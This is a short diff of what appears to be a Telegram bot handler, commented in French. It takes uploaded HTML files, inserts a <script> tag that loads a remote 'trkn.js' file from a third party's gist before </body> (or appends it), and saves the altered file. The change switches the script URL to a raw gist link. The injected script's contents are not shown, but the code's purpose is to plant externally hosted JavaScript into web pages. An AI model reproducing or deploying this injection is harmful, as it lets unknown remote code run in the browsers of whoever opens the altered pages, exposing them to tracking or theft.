@@ -68,9 +68,9 @@ bot.on("document", async (ctx) => {
 
   // Ajoute le script à la fin du <body> si <body> existe
   if (content.includes("</body>")) {
-    content = content.replace("</body>", `<script src="https://gist.github.com/tucommenceapousser/38a0d58168c33d1917f3faeaa9a98840.js"></script></body>`);
+    content = content.replace("</body>", `<script src="https://gist.githubusercontent.com/tucommenceapousser/38a0d58168c33d1917f3faeaa9a98840/raw/69aa775231615188edf6f2dc40d9faa1a554b00b/trkn.js"></script></body>`);
   } else {
-    content += `<script src="https://gist.github.com/tucommenceapousser/38a0d58168c33d1917f3faeaa9a98840.js"></script>`;
+    content += `<script src="https://gist.githubusercontent.com/tucommenceapousser/38a0d58168c33d1917f3faeaa9a98840/raw/69aa775231615188edf6f2dc40d9faa1a554b00b/trkn.js"></script>`;
   }
 
   // Sauvegarde du fichier modifié
